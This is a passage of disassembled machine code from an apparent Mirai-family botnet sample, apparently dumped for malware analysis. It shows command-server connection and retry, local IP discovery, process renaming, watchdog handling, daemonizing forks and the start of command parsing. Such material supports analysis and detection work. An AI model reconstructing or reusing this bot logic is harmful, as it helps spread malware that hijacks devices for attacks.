
/Users/taogoldi/Projects/Malware/Mirai/input/094e9d6ee057d38f40c35f018488e35ab6ccd006ed261b17322e78fd5ea2c0cb.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000405e72 <initConnection>:
  405ec5: 00 00                        	add	byte ptr [rax], al
  405ec7: 00 00                        	add	byte ptr [rax], al
  405ec9: 00 eb                        	add	bl, ch
  405ecb: 0e                           	<unknown>
  405ecc: 8b 05 ce eb 10 00            	mov	eax, dword ptr [rip + 0x10ebce] # 0x514aa0 <KHserverHACKER>
  405ed2: ff c0                        	inc	eax
  405ed4: 89 05 c6 eb 10 00            	mov	dword ptr [rip + 0x10ebc6], eax # 0x514aa0 <KHserverHACKER>
  405eda: 8b 05 c0 eb 10 00            	mov	eax, dword ptr [rip + 0x10ebc0] # 0x514aa0 <KHserverHACKER>
  405ee0: 48 98                        	cdqe
  405ee2: 44 8b 04 85 6c 49 51 00      	mov	r8d, dword ptr [4*rax + 0x51496c]
  405eea: 8b 05 b0 eb 10 00            	mov	eax, dword ptr [rip + 0x10ebb0] # 0x514aa0 <KHserverHACKER>
  405ef0: 48 98                        	cdqe
  405ef2: 8b 14 85 68 49 51 00         	mov	edx, dword ptr [4*rax + 0x514968]
  405ef9: 8b 05 a1 eb 10 00            	mov	eax, dword ptr [rip + 0x10eba1] # 0x514aa0 <KHserverHACKER>
  405eff: 48 98                        	cdqe
  405f01: 8b 0c 85 64 49 51 00         	mov	ecx, dword ptr [4*rax + 0x514964]
  405f08: 8b 05 92 eb 10 00            	mov	eax, dword ptr [rip + 0x10eb92] # 0x514aa0 <KHserverHACKER>
  405f0e: 48 98                        	cdqe
  405f10: 8b 04 85 60 49 51 00         	mov	eax, dword ptr [4*rax + 0x514960]
  405f17: be dd 2a 41 00               	mov	esi, 0x412add
  405f1c: 48 8d bd f0 ef ff ff         	lea	rdi, [rbp - 0x1010]
  405f23: 45 89 c1                     	mov	r9d, r8d
  405f26: 41 89 d0                     	mov	r8d, edx
  405f29: 89 c2                        	mov	edx, eax
  405f2b: b8 00 00 00 00               	mov	eax, 0x0
  405f30: e8 1e b0 ff ff               	call	0x400f53 <szprintf>
  405f35: 8b 05 35 ea 10 00            	mov	eax, dword ptr [rip + 0x10ea35] # 0x514970 <axis_bp>
  405f3b: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  405f3e: 48 8d bd f0 ef ff ff         	lea	rdi, [rbp - 0x1010]
  405f45: be 3a 00 00 00               	mov	esi, 0x3a
  405f4a: e8 61 35 00 00               	call	0x4094b0 <strchr>
  405f4f: 48 85 c0                     	test	rax, rax
  405f52: 74 31                        	je	0x405f85 <initConnection+0x113>
  405f54: 48 8d bd f0 ef ff ff         	lea	rdi, [rbp - 0x1010]
  405f5b: be 3a 00 00 00               	mov	esi, 0x3a
  405f60: e8 4b 35 00 00               	call	0x4094b0 <strchr>
  405f65: 48 8d 78 01                  	lea	rdi, [rax + 0x1]
  405f69: e8 1e 59 00 00               	call	0x40b88c <atoi>
  405f6e: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  405f71: 48 8d bd f0 ef ff ff         	lea	rdi, [rbp - 0x1010]
  405f78: be 3a 00 00 00               	mov	esi, 0x3a
  405f7d: e8 2e 35 00 00               	call	0x4094b0 <strchr>
  405f82: c6 00 00                     	mov	byte ptr [rax], 0x0
  405f85: ba 00 00 00 00               	mov	edx, 0x0
  405f8a: be 01 00 00 00               	mov	esi, 0x1
  405f8f: bf 02 00 00 00               	mov	edi, 0x2
  405f94: e8 73 41 00 00               	call	0x40a10c <socket>
  405f99: 89 05 e1 ef 10 00            	mov	dword ptr [rip + 0x10efe1], eax # 0x514f80 <KHcommSOCK>
  405f9f: 48 8d b5 f0 ef ff ff         	lea	rsi, [rbp - 0x1010]
  405fa6: 8b 3d d4 ef 10 00            	mov	edi, dword ptr [rip + 0x10efd4] # 0x514f80 <KHcommSOCK>
  405fac: 8b 55 fc                     	mov	edx, dword ptr [rbp - 0x4]
  405faf: b9 1e 00 00 00               	mov	ecx, 0x1e
  405fb4: e8 97 ba ff ff               	call	0x401a50 <connectTimeout>
  405fb9: 85 c0                        	test	eax, eax
  405fbb: 75 0c                        	jne	0x405fc9 <initConnection+0x157>
  405fbd: c7 85 ec ef ff ff 01 00 00 00	mov	dword ptr [rbp - 0x1014], 0x1
  405fc7: eb 0a                        	jmp	0x405fd3 <initConnection+0x161>
  405fc9: c7 85 ec ef ff ff 00 00 00 00	mov	dword ptr [rbp - 0x1014], 0x0
  405fd3: 8b 85 ec ef ff ff            	mov	eax, dword ptr [rbp - 0x1014]
  405fd9: c9                           	leave
  405fda: c3                           	ret

0000000000405fdb <getOurIP>:
  405fdb: 55                           	push	rbp
  405fdc: 48 89 e5                     	mov	rbp, rsp
  405fdf: 48 81 ec 90 10 00 00         	sub	rsp, 0x1090
  405fe6: ba 00 00 00 00               	mov	edx, 0x0
  405feb: be 02 00 00 00               	mov	esi, 0x2
  405ff0: bf 02 00 00 00               	mov	edi, 0x2
  405ff5: e8 12 41 00 00               	call	0x40a10c <socket>
  405ffa: 89 45 e4                     	mov	dword ptr [rbp - 0x1c], eax
  405ffd: 83 7d e4 ff                  	cmp	dword ptr [rbp - 0x1c], -0x1
  406001: 75 0f                        	jne	0x406012 <getOurIP+0x37>
  406003: c7 85 7c ef ff ff 00 00 00 00	mov	dword ptr [rbp - 0x1084], 0x0
  40600d: e9 99 01 00 00               	jmp	0x4061ab <getOurIP+0x1d0>
  406012: 48 8d 45 d0                  	lea	rax, [rbp - 0x30]
  406016: 48 c7 00 00 00 00 00         	mov	qword ptr [rax], 0x0
  40601d: 48 c7 40 08 00 00 00 00      	mov	qword ptr [rax + 0x8], 0x0
  406025: 66 c7 45 d0 02 00            	mov	word ptr [rbp - 0x30], 0x2
  40602b: bf e9 2a 41 00               	mov	edi, 0x412ae9
  406030: e8 97 3b 00 00               	call	0x409bcc <inet_addr>
  406035: 89 45 d4                     	mov	dword ptr [rbp - 0x2c], eax
  406038: bf 35 00 00 00               	mov	edi, 0x35
  40603d: e8 6e 3b 00 00               	call	0x409bb0 <htons>
  406042: 66 89 45 d2                  	mov	word ptr [rbp - 0x2e], ax
  406046: 48 8d 75 d0                  	lea	rsi, [rbp - 0x30]
  40604a: 8b 7d e4                     	mov	edi, dword ptr [rbp - 0x1c]
  40604d: ba 10 00 00 00               	mov	edx, 0x10
  406052: e8 79 3f 00 00               	call	0x409fd0 <connect>
  406057: 89 45 e8                     	mov	dword ptr [rbp - 0x18], eax
  40605a: 83 7d e8 ff                  	cmp	dword ptr [rbp - 0x18], -0x1
  40605e: 75 0f                        	jne	0x40606f <getOurIP+0x94>
  406060: c7 85 7c ef ff ff 00 00 00 00	mov	dword ptr [rbp - 0x1084], 0x0
  40606a: e9 3c 01 00 00               	jmp	0x4061ab <getOurIP+0x1d0>
  40606f: c7 45 bc 10 00 00 00         	mov	dword ptr [rbp - 0x44], 0x10
  406076: 48 8d 75 c0                  	lea	rsi, [rbp - 0x40]
  40607a: 48 8d 55 bc                  	lea	rdx, [rbp - 0x44]
  40607e: 8b 7d e4                     	mov	edi, dword ptr [rbp - 0x1c]
  406081: e8 76 3f 00 00               	call	0x409ffc <getsockname>
  406086: 89 45 e8                     	mov	dword ptr [rbp - 0x18], eax
  406089: 83 7d e8 ff                  	cmp	dword ptr [rbp - 0x18], -0x1
  40608d: 75 0f                        	jne	0x40609e <getOurIP+0xc3>
  40608f: c7 85 7c ef ff ff 00 00 00 00	mov	dword ptr [rbp - 0x1084], 0x0
  406099: e9 0d 01 00 00               	jmp	0x4061ab <getOurIP+0x1d0>
  40609e: 8b 45 c4                     	mov	eax, dword ptr [rbp - 0x3c]
  4060a1: 89 05 19 52 11 00            	mov	dword ptr [rip + 0x115219], eax # 0x51b2c0 <ourIP>
  4060a7: be 00 00 00 00               	mov	esi, 0x0
  4060ac: bf f1 2a 41 00               	mov	edi, 0x412af1
  4060b1: b8 00 00 00 00               	mov	eax, 0x0
  4060b6: e8 81 1f 00 00               	call	0x40803c <open>
  4060bb: 89 45 ec                     	mov	dword ptr [rbp - 0x14], eax
  4060be: eb 54                        	jmp	0x406114 <getOurIP+0x139>
  4060c0: 48 8d bd b0 ef ff ff         	lea	rdi, [rbp - 0x1050]
  4060c7: be 01 2b 41 00               	mov	esi, 0x412b01
  4060cc: e8 a7 38 00 00               	call	0x409978 <strstr>
  4060d1: 48 85 c0                     	test	rax, rax
  4060d4: 74 25                        	je	0x4060fb <getOurIP+0x120>
  4060d6: 48 8d 85 b0 ef ff ff         	lea	rax, [rbp - 0x1050]
  4060dd: 48 89 45 f0                  	mov	qword ptr [rbp - 0x10], rax
  4060e1: eb 04                        	jmp	0x4060e7 <getOurIP+0x10c>
  4060e3: 48 ff 45 f0                  	inc	qword ptr [rbp - 0x10]
  4060e7: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4060eb: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4060ee: 3c 09                        	cmp	al, 0x9
  4060f0: 75 f1                        	jne	0x4060e3 <getOurIP+0x108>
  4060f2: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4060f6: c6 00 00                     	mov	byte ptr [rax], 0x0
  4060f9: eb 32                        	jmp	0x40612d <getOurIP+0x152>
  4060fb: 48 8d 85 b0 ef ff ff         	lea	rax, [rbp - 0x1050]
  406102: 48 89 c7                     	mov	rdi, rax
  406105: ba 00 10 00 00               	mov	edx, 0x1000
  40610a: be 00 00 00 00               	mov	esi, 0x0
  40610f: e8 bc 32 00 00               	call	0x4093d0 <memset>
  406114: 48 8d bd b0 ef ff ff         	lea	rdi, [rbp - 0x1050]
  40611b: 8b 55 ec                     	mov	edx, dword ptr [rbp - 0x14]
  40611e: be 00 10 00 00               	mov	esi, 0x1000
  406123: e8 0c b4 ff ff               	call	0x401534 <fdgets>
  406128: 48 85 c0                     	test	rax, rax
  40612b: 75 93                        	jne	0x4060c0 <getOurIP+0xe5>
  40612d: 8b 7d ec                     	mov	edi, dword ptr [rbp - 0x14]
  406130: e8 2f 1d 00 00               	call	0x407e64 <close>
  406135: 0f b6 85 b0 ef ff ff         	movzx	eax, byte ptr [rbp - 0x1050]
  40613c: 84 c0                        	test	al, al
  40613e: 74 61                        	je	0x4061a1 <getOurIP+0x1c6>
  406140: 48 8d b5 b0 ef ff ff         	lea	rsi, [rbp - 0x1050]
  406147: 48 8d bd 80 ef ff ff         	lea	rdi, [rbp - 0x1080]
  40614e: e8 0d 35 00 00               	call	0x409660 <strcpy>
  406153: 48 8d 95 80 ef ff ff         	lea	rdx, [rbp - 0x1080]
  40615a: 8b 7d e4                     	mov	edi, dword ptr [rbp - 0x1c]
  40615d: be 27 89 00 00               	mov	esi, 0x8927
  406162: b8 00 00 00 00               	mov	eax, 0x0
  406167: e8 3c 1e 00 00               	call	0x407fa8 <ioctl>
  40616c: c7 45 fc 00 00 00 00         	mov	dword ptr [rbp - 0x4], 0x0
  406173: eb 26                        	jmp	0x40619b <getOurIP+0x1c0>
  406175: 8b 4d fc                     	mov	ecx, dword ptr [rbp - 0x4]
  406178: 48 8d 85 80 ef ff ff         	lea	rax, [rbp - 0x1080]
  40617f: 48 8d 50 12                  	lea	rdx, [rax + 0x12]
  406183: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  406186: 48 98                        	cdqe
  406188: 48 8d 04 02                  	lea	rax, [rdx + rax]
  40618c: 0f b6 10                     	movzx	edx, byte ptr [rax]
  40618f: 48 63 c1                     	movsxd	rax, ecx
  406192: 88 90 94 4f 51 00            	mov	byte ptr [rax + 0x514f94], dl
  406198: ff 45 fc                     	inc	dword ptr [rbp - 0x4]
  40619b: 83 7d fc 05                  	cmp	dword ptr [rbp - 0x4], 0x5
  40619f: 7e d4                        	jle	0x406175 <getOurIP+0x19a>
  4061a1: 8b 7d e4                     	mov	edi, dword ptr [rbp - 0x1c]
  4061a4: e8 bb 1c 00 00               	call	0x407e64 <close>
  4061a9: eb 0c                        	jmp	0x4061b7 <getOurIP+0x1dc>
  4061ab: 8b 85 7c ef ff ff            	mov	eax, dword ptr [rbp - 0x1084]
  4061b1: 89 85 78 ef ff ff            	mov	dword ptr [rbp - 0x1088], eax
  4061b7: 8b 85 78 ef ff ff            	mov	eax, dword ptr [rbp - 0x1088]
  4061bd: c9                           	leave
  4061be: c3                           	ret

00000000004061bf <getBuild>:
  4061bf: 55                           	push	rbp
  4061c0: 48 89 e5                     	mov	rbp, rsp
  4061c3: c9                           	leave
  4061c4: c3                           	ret

00000000004061c5 <main>:
  4061c5: 55                           	push	rbp
  4061c6: 48 89 e5                     	mov	rbp, rsp
  4061c9: 53                           	push	rbx
  4061ca: 48 81 ec 18 11 00 00         	sub	rsp, 0x1118
  4061d1: 89 bd 2c ef ff ff            	mov	dword ptr [rbp - 0x10d4], edi
  4061d7: 48 89 b5 20 ef ff ff         	mov	qword ptr [rbp - 0x10e0], rsi
  4061de: 48 c7 45 88 0c 2b 41 00      	mov	qword ptr [rbp - 0x78], 0x412b0c
  4061e6: be 00 00 00 00               	mov	esi, 0x0
  4061eb: bf 0d 2b 41 00               	mov	edi, 0x412b0d
  4061f0: e8 43 1c 00 00               	call	0x407e38 <access>
  4061f5: 83 f8 ff                     	cmp	eax, -0x1
  4061f8: 74 0a                        	je	0x406204 <main+0x3f>
  4061fa: 48 c7 45 88 1d 2b 41 00      	mov	qword ptr [rbp - 0x78], 0x412b1d
  406202: eb 08                        	jmp	0x40620c <main+0x47>
  406204: 48 c7 45 88 22 2b 41 00      	mov	qword ptr [rbp - 0x78], 0x412b22
  40620c: e8 f7 1c 00 00               	call	0x407f08 <geteuid>
  406211: 85 c0                        	test	eax, eax
  406213: 75 0a                        	jne	0x40621f <main+0x5a>
  406215: c7 05 85 e8 10 00 00 00 00 00	mov	dword ptr [rip + 0x10e885], 0x0 # 0x514aa4 <userID>
  40621f: 48 8b 85 20 ef ff ff         	mov	rax, qword ptr [rbp - 0x10e0]
  406226: 48 8b 00                     	mov	rax, qword ptr [rax]
  406229: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  406230: 48 89 85 18 ef ff ff         	mov	qword ptr [rbp - 0x10e8], rax
  406237: b8 00 00 00 00               	mov	eax, 0x0
  40623c: fc                           	cld
  40623d: 48 8b bd 18 ef ff ff         	mov	rdi, qword ptr [rbp - 0x10e8]
  406244: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  406246: 48 89 c8                     	mov	rax, rcx
  406249: 48 f7 d0                     	not	rax
  40624c: 48 8d 50 ff                  	lea	rdx, [rax - 0x1]
  406250: 48 8b 85 20 ef ff ff         	mov	rax, qword ptr [rbp - 0x10e0]
  406257: 48 8b 00                     	mov	rax, qword ptr [rax]
  40625a: 48 89 c7                     	mov	rdi, rax
  40625d: be 0c 2b 41 00               	mov	esi, 0x412b0c
  406262: e8 bd 35 00 00               	call	0x409824 <strncpy>
  406267: 48 8b 85 20 ef ff ff         	mov	rax, qword ptr [rbp - 0x10e0]
  40626e: 48 8b 00                     	mov	rax, qword ptr [rax]
  406271: 48 89 c7                     	mov	rdi, rax
  406274: 48 8b 75 88                  	mov	rsi, qword ptr [rbp - 0x78]
  406278: b8 00 00 00 00               	mov	eax, 0x0
  40627d: e8 e6 1f 00 00               	call	0x408268 <sprintf>
  406282: 48 8b 45 88                  	mov	rax, qword ptr [rbp - 0x78]
  406286: 48 89 c6                     	mov	rsi, rax
  406289: 41 b8 00 00 00 00            	mov	r8d, 0x0
  40628f: b9 00 00 00 00               	mov	ecx, 0x0
  406294: ba 00 00 00 00               	mov	edx, 0x0
  406299: bf 0f 00 00 00               	mov	edi, 0xf
  40629e: b8 00 00 00 00               	mov	eax, 0x0
  4062a3: e8 34 1e 00 00               	call	0x4080dc <prctl>
  4062a8: bf 00 00 00 00               	mov	edi, 0x0
  4062ad: e8 02 1f 00 00               	call	0x4081b4 <time>
  4062b2: 89 c3                        	mov	ebx, eax
  4062b4: e8 77 1c 00 00               	call	0x407f30 <getpid>
  4062b9: 31 d8                        	xor	eax, ebx
  4062bb: 89 c7                        	mov	edi, eax
  4062bd: e8 1e 53 00 00               	call	0x40b5e0 <srandom>
  4062c2: bf 00 00 00 00               	mov	edi, 0x0
  4062c7: e8 e8 1e 00 00               	call	0x4081b4 <time>
  4062cc: 89 c3                        	mov	ebx, eax
  4062ce: e8 5d 1c 00 00               	call	0x407f30 <getpid>
  4062d3: 31 d8                        	xor	eax, ebx
  4062d5: 89 c7                        	mov	edi, eax
  4062d7: e8 28 a2 ff ff               	call	0x400504 <init_rand>
  4062dc: b8 00 00 00 00               	mov	eax, 0x0
  4062e1: e8 f5 fc ff ff               	call	0x405fdb <getOurIP>
  4062e6: e8 61 0e 00 00               	call	0x40714c <table_init>
  4062eb: c7 45 80 00 00 00 00         	mov	dword ptr [rbp - 0x80], 0x0
  4062f2: bf 01 00 00 00               	mov	edi, 0x1
  4062f7: e8 22 10 00 00               	call	0x40731e <table_unlock_val>
  4062fc: 48 8d 75 80                  	lea	rsi, [rbp - 0x80]
  406300: bf 01 00 00 00               	mov	edi, 0x1
  406305: e8 66 10 00 00               	call	0x407370 <table_retrieve_val>
  40630a: 48 89 45 98                  	mov	qword ptr [rbp - 0x68], rax
  40630e: 8b 45 80                     	mov	eax, dword ptr [rbp - 0x80]
  406311: 48 63 d0                     	movsxd	rdx, eax
  406314: 48 8b 75 98                  	mov	rsi, qword ptr [rbp - 0x68]
  406318: bf 01 00 00 00               	mov	edi, 0x1
  40631d: e8 c2 1e 00 00               	call	0x4081e4 <write>
  406322: ba 01 00 00 00               	mov	edx, 0x1
  406327: be 35 2b 41 00               	mov	esi, 0x412b35
  40632c: bf 01 00 00 00               	mov	edi, 0x1
  406331: e8 ae 1e 00 00               	call	0x4081e4 <write>
  406336: bf 01 00 00 00               	mov	edi, 0x1
  40633b: e8 07 10 00 00               	call	0x407347 <table_lock_val>
  406340: e8 ab a0 ff ff               	call	0x4003f0 <watchdog_maintain>
  406345: e8 72 1b 00 00               	call	0x407ebc <fork>
  40634a: 89 45 90                     	mov	dword ptr [rbp - 0x70], eax
  40634d: 83 7d 90 00                  	cmp	dword ptr [rbp - 0x70], 0x0
  406351: 74 1b                        	je	0x40636e <main+0x1a9>
  406353: 48 8d 75 84                  	lea	rsi, [rbp - 0x7c]
  406357: 8b 7d 90                     	mov	edi, dword ptr [rbp - 0x70]
  40635a: ba 00 00 00 00               	mov	edx, 0x0
  40635f: e8 78 1e 00 00               	call	0x4081dc <waitpid>
  406364: bf 00 00 00 00               	mov	edi, 0x0
  406369: e8 aa 56 00 00               	call	0x40ba18 <exit>
  40636e: 83 7d 90 00                  	cmp	dword ptr [rbp - 0x70], 0x0
  406372: 75 18                        	jne	0x40638c <main+0x1c7>
  406374: e8 43 1b 00 00               	call	0x407ebc <fork>
  406379: 89 45 94                     	mov	dword ptr [rbp - 0x6c], eax
  40637c: 83 7d 94 00                  	cmp	dword ptr [rbp - 0x6c], 0x0
  406380: 74 0a                        	je	0x40638c <main+0x1c7>
  406382: bf 00 00 00 00               	mov	edi, 0x0
  406387: e8 8c 56 00 00               	call	0x40ba18 <exit>
  40638c: be 01 00 00 00               	mov	esi, 0x1
  406391: bf 0d 00 00 00               	mov	edi, 0xd
  406396: e8 d9 3d 00 00               	call	0x40a174 <signal>
  40639b: eb 00                        	jmp	0x40639d <main+0x1d8>
  40639d: b8 00 00 00 00               	mov	eax, 0x0
  4063a2: e8 cb fa ff ff               	call	0x405e72 <initConnection>
  4063a7: 85 c0                        	test	eax, eax
  4063a9: 74 0c                        	je	0x4063b7 <main+0x1f2>
  4063ab: bf 05 00 00 00               	mov	edi, 0x5
  4063b0: e8 df 57 00 00               	call	0x40bb94 <sleep>
  4063b5: eb e6                        	jmp	0x40639d <main+0x1d8>
  4063b7: b8 00 00 00 00               	mov	eax, 0x0
  4063bc: e8 fe fd ff ff               	call	0x4061bf <getBuild>
  4063c1: 8b 3d b9 eb 10 00            	mov	edi, dword ptr [rip + 0x10ebb9] # 0x514f80 <KHcommSOCK>
  4063c7: ba 37 2b 41 00               	mov	edx, 0x412b37
  4063cc: be 3b 2b 41 00               	mov	esi, 0x412b3b
  4063d1: b8 00 00 00 00               	mov	eax, 0x0
  4063d6: e8 5d ac ff ff               	call	0x401038 <sockprintf>
  4063db: c7 45 a0 00 00 00 00         	mov	dword ptr [rbp - 0x60], 0x0
  4063e2: c7 45 a4 00 00 00 00         	mov	dword ptr [rbp - 0x5c], 0x0
  4063e9: e9 41 04 00 00               	jmp	0x40682f <main+0x66a>
  4063ee: c7 45 a4 00 00 00 00         	mov	dword ptr [rbp - 0x5c], 0x0
  4063f5: e9 24 01 00 00               	jmp	0x40651e <main+0x359>
  4063fa: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  4063fd: 48 98                        	cdqe
  4063ff: 48 c1 e0 02                  	shl	rax, 0x2
  406403: 48 89 c2                     	mov	rdx, rax
  406406: 48 8b 05 c3 4e 11 00         	mov	rax, qword ptr [rip + 0x114ec3] # 0x51b2d0 <pids>
  40640d: 48 8d 04 02                  	lea	rax, [rdx + rax]
  406411: 8b 00                        	mov	eax, dword ptr [rax]
  406413: 89 c7                        	mov	edi, eax
  406415: ba 01 00 00 00               	mov	edx, 0x1
  40641a: be 00 00 00 00               	mov	esi, 0x0
  40641f: e8 b8 1d 00 00               	call	0x4081dc <waitpid>
  406424: 85 c0                        	test	eax, eax
  406426: 0f 8e ef 00 00 00            	jle	0x40651b <main+0x356>
  40642c: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  40642f: ff c0                        	inc	eax
  406431: 89 45 bc                     	mov	dword ptr [rbp - 0x44], eax
  406434: eb 35                        	jmp	0x40646b <main+0x2a6>
  406436: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  406439: ff c8                        	dec	eax
  40643b: 89 c0                        	mov	eax, eax
  40643d: 48 c1 e0 02                  	shl	rax, 0x2
  406441: 48 89 c2                     	mov	rdx, rax
  406444: 48 8b 05 85 4e 11 00         	mov	rax, qword ptr [rip + 0x114e85] # 0x51b2d0 <pids>
  40644b: 48 8d 0c 02                  	lea	rcx, [rdx + rax]
  40644f: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  406452: 48 c1 e0 02                  	shl	rax, 0x2
  406456: 48 89 c2                     	mov	rdx, rax
  406459: 48 8b 05 70 4e 11 00         	mov	rax, qword ptr [rip + 0x114e70] # 0x51b2d0 <pids>
  406460: 48 8d 04 02                  	lea	rax, [rdx + rax]
  406464: 8b 00                        	mov	eax, dword ptr [rax]
  406466: 89 01                        	mov	dword ptr [rcx], eax
  406468: ff 45 bc                     	inc	dword ptr [rbp - 0x44]
  40646b: 8b 55 bc                     	mov	edx, dword ptr [rbp - 0x44]
  40646e: 48 8b 05 13 eb 10 00         	mov	rax, qword ptr [rip + 0x10eb13] # 0x514f88 <numpids>
  406475: 48 39 c2                     	cmp	rdx, rax
  406478: 72 bc                        	jb	0x406436 <main+0x271>
  40647a: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  40647d: ff c8                        	dec	eax
  40647f: 89 c0                        	mov	eax, eax
  406481: 48 c1 e0 02                  	shl	rax, 0x2
  406485: 48 89 c2                     	mov	rdx, rax
  406488: 48 8b 05 41 4e 11 00         	mov	rax, qword ptr [rip + 0x114e41] # 0x51b2d0 <pids>
  40648f: 48 8d 04 02                  	lea	rax, [rdx + rax]
  406493: c7 00 00 00 00 00            	mov	dword ptr [rax], 0x0
  406499: 48 8b 05 e8 ea 10 00         	mov	rax, qword ptr [rip + 0x10eae8] # 0x514f88 <numpids>
  4064a0: 48 ff c8                     	dec	rax
  4064a3: 48 89 05 de ea 10 00         	mov	qword ptr [rip + 0x10eade], rax # 0x514f88 <numpids>
  4064aa: 48 8b 05 d7 ea 10 00         	mov	rax, qword ptr [rip + 0x10ead7] # 0x514f88 <numpids>
  4064b1: 48 c1 e0 02                  	shl	rax, 0x2
  4064b5: 48 8d 78 04                  	lea	rdi, [rax + 0x4]
  4064b9: e8 1a 3e 00 00               	call	0x40a2d8 <malloc>
  4064be: 48 89 45 b0                  	mov	qword ptr [rbp - 0x50], rax
  4064c2: c7 45 bc 00 00 00 00         	mov	dword ptr [rbp - 0x44], 0x0
  4064c9: eb 2a                        	jmp	0x4064f5 <main+0x330>
  4064cb: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  4064ce: 48 c1 e0 02                  	shl	rax, 0x2
  4064d2: 48 89 c1                     	mov	rcx, rax
  4064d5: 48 03 4d b0                  	add	rcx, qword ptr [rbp - 0x50]
  4064d9: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  4064dc: 48 c1 e0 02                  	shl	rax, 0x2
  4064e0: 48 89 c2                     	mov	rdx, rax
  4064e3: 48 8b 05 e6 4d 11 00         	mov	rax, qword ptr [rip + 0x114de6] # 0x51b2d0 <pids>
  4064ea: 48 8d 04 02                  	lea	rax, [rdx + rax]
  4064ee: 8b 00                        	mov	eax, dword ptr [rax]
  4064f0: 89 01                        	mov	dword ptr [rcx], eax
  4064f2: ff 45 bc                     	inc	dword ptr [rbp - 0x44]
  4064f5: 8b 55 bc                     	mov	edx, dword ptr [rbp - 0x44]
  4064f8: 48 8b 05 89 ea 10 00         	mov	rax, qword ptr [rip + 0x10ea89] # 0x514f88 <numpids>
  4064ff: 48 39 c2                     	cmp	rdx, rax
  406502: 72 c7                        	jb	0x4064cb <main+0x306>
  406504: 48 8b 3d c5 4d 11 00         	mov	rdi, qword ptr [rip + 0x114dc5] # 0x51b2d0 <pids>
  40650b: e8 b7 4c 00 00               	call	0x40b1c7 <free>
  406510: 48 8b 45 b0                  	mov	rax, qword ptr [rbp - 0x50]
  406514: 48 89 05 b5 4d 11 00         	mov	qword ptr [rip + 0x114db5], rax # 0x51b2d0 <pids>
  40651b: ff 45 a4                     	inc	dword ptr [rbp - 0x5c]
  40651e: 8b 45 a4                     	mov	eax, dword ptr [rbp - 0x5c]
  406521: 48 63 d0                     	movsxd	rdx, eax
  406524: 48 8b 05 5d ea 10 00         	mov	rax, qword ptr [rip + 0x10ea5d] # 0x514f88 <numpids>
  40652b: 48 39 c2                     	cmp	rdx, rax
  40652e: 0f 82 c6 fe ff ff            	jb	0x4063fa <main+0x235>
  406534: 8b 45 a0                     	mov	eax, dword ptr [rbp - 0x60]
  406537: 48 98                        	cdqe
  406539: c6 84 05 30 ef ff ff 00      	mov	byte ptr [rbp + rax - 0x10d0], 0x0
  406541: 48 8d bd 30 ef ff ff         	lea	rdi, [rbp - 0x10d0]
  406548: e8 34 a0 ff ff               	call	0x400581 <trim>
  40654d: 48 8d 85 30 ef ff ff         	lea	rax, [rbp - 0x10d0]
  406554: 48 89 45 a8                  	mov	qword ptr [rbp - 0x58], rax
  406558: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  40655c: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40655f: 3c 2e                        	cmp	al, 0x2e
  406561: 0f 85 c8 02 00 00            	jne	0x40682f <main+0x66a>
  406567: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  40656b: 48 ff c0                     	inc	rax
  40656e: 48 89 45 c0                  	mov	qword ptr [rbp - 0x40], rax
  406572: eb 04                        	jmp	0x406578 <main+0x3b3>
  406574: 48 ff 45 c0                  	inc	qword ptr [rbp - 0x40]
  406578: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  40657c: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40657f: 3c 20                        	cmp	al, 0x20
  406581: 74 0b                        	je	0x40658e <main+0x3c9>
  406583: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  406587: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40658a: 84 c0                        	test	al, al
  40658c: 75 e6                        	jne	0x406574 <main+0x3af>
  40658e: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  406592: 0f b6 00                     	movzx	eax, byte ptr [rax]
  406595: 84 c0                        	test	al, al
  406597: 0f 84 92 02 00 00            	je	0x40682f <main+0x66a>
  40659d: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  4065a1: c6 00 00                     	mov	byte ptr [rax], 0x0
  4065a4: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4065a8: 48 ff c0                     	inc	rax
  4065ab: 48 89 45 c0                  	mov	qword ptr [rbp - 0x40], rax
  4065af: 48 8b 45 c0                  	mov	rax, qword ptr [rbp - 0x40]
  4065b3: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  4065ba: 48 89 85 10 ef ff ff         	mov	qword ptr [rbp - 0x10f0], rax
  4065c1: b8 00 00 00 00               	mov	eax, 0x0
  4065c6: fc                           	cld
  4065c7: 48 8b bd 10 ef ff ff         	mov	rdi, qword ptr [rbp - 0x10f0]
  4065ce: f2 ae                        	repne		scasb	al, byte ptr es:[rdi]
  4065d0: 48 89 c8                     	mov	rax, rcx
  4065d3: 48 f7 d0                     	not	rax
  4065d6: 48 ff c8                     	dec	rax
  4065d9: 48 03 45 a8                  	add	rax, qword ptr [rbp - 0x58]
  4065dd: 48 83 c0 02                  	add	rax, 0x2
  4065e1: 48 89 45 a8                  	mov	qword ptr [rbp - 0x58], rax
  4065e5: eb 34                        	jmp	0x40661b <main+0x456>
  4065e7: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4065eb: 48 c7 c1 ff ff ff ff         	mov	rcx, -0x1
  4065f2: 48 89 85 08 ef ff ff         	mov	qword ptr [rbp - 0x10f8], rax
